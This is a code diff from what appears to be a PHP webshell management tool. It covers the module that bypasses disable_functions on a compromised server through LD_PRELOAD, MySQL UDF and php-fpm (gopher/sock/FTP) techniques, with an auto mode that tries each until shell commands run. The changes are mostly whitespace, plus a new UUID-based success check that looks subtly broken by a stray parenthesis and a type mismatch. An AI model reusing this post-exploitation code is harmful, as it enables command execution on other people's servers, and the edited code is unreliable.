@@ -39,15 +39,18 @@ def get_detectd_ext(extname: str):
 
 
 def set_mode(mode: int, test: bool = False):
+
     if (mode in mode_require_ext_dict):
         ext = mode_require_ext_dict[mode]
         res = send(get_detectd_ext(ext))
         if (not res):
             return False
+
         text = res.r_text.strip()
         if ("exist" not in text):
             print(color.red(f"\nNo {ext} extension\n"))
             return False
+
     if (mode == 4 and not gget("webshell.ld_preload_path", "webshell", False)):  # ld_preload
         if is_windows():
             print(color.red("\nNo ld_preload function!\n"))
@@ -99,6 +102,7 @@ def set_mode(mode: int, test: bool = False):
             gset("webshell.ld_preload_func", trigger_func, True, "webshell")
 
     elif (mode == 8):  # udf
+
         if (gget("db_connected", "webshell") and gget("db_dbms", "webshell") == "mysql"):
             # detect plugin dir
             print(color.yellow("\nDetect plugin dir..."))
@@ -164,15 +168,20 @@ def set_mode(mode: int, test: bool = False):
         else:
             print(color.red("\nNo connection to database or dbms isn't mysql\n"))
             return False
+
     elif (mode == 10):  # php-fpm
         res = send("print(php_sapi_name());")
+
         if (not res):
             print(color.red("\nNo response\n"))
             return False
+
         print(color.yellow("php_sapi_name: " + res.r_text))
+
         requirements_dict = {'host': '127.0.0.1', 'port': 9000}
-        attack_type = input(
-            "attack_type[gopher(need curl extension)/sock/http_sock/ftp]:").lower()
+
+        attack_type = input("attack_type[gopher(need curl extension)/sock/http_sock/ftp]:").lower()
+
         if (attack_type not in ["gopher", "sock", "http_sock", "ftp"]):
             return False
 
@@ -180,11 +189,13 @@ def set_mode(mode: int, test: bool = False):
 
         # input sock path
         if (attack_type == "sock"):
+
             sock_path = "/var/run/php7-fpm.sock"
             new_v = input(f"sock_path[{sock_path}]:")
             if new_v:
                 sock_path = new_v
             gset("webshell.bdf_fpm.sock_path", sock_path, True, "webshell")
+
         else:
             # input fpm http host and port
             for k, v in requirements_dict.items():
@@ -463,22 +474,28 @@ def run(mode: str = '0'):
     """
     if (mode == "close"):
         mode = -1
+
     if (mode == "auto"):
         test_list = windows_test_list if is_windows() else linux_test_list
         php_version = gget("webshell.php_version", "webshell")
+
         if (not php_version.startswith("7.")):
             test_list -= {1, 2, 3, 9, 13, 14}
+
         if (not gget("db_connected", "webshell") or gget("db_dbms", "webshell") != "mysql"):
             test_list -= {8}
+
         for test_mode in test_list:
+
             print(f"Try Mode {test_mode} {mode_to_desc_dict[test_mode]}:")
+
             if (set_mode(test_mode, True)):
-                res = send(get_system_code(
-                    "echo 6ac2ed344113c07c0028327388553273", mode=test_mode))
-                if (res and "6ac2ed344113c07c0028327388553273" in res.r_text):
+                tag = uuid4()
+                res = send(get_system_code(f"echo {tag})", mode=test_mode))
+
+                if (res and tag in res.r_text):
                     print(color.green("\n    Success\n"))
-                    print(
-                        f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
+                    print(f"Set bypass disable_functions: {test_mode}-{mode_to_desc_dict[test_mode]}\n")
                     gset("webshell.bypass_df", test_mode, True, "webshell")
                     break
                 else:
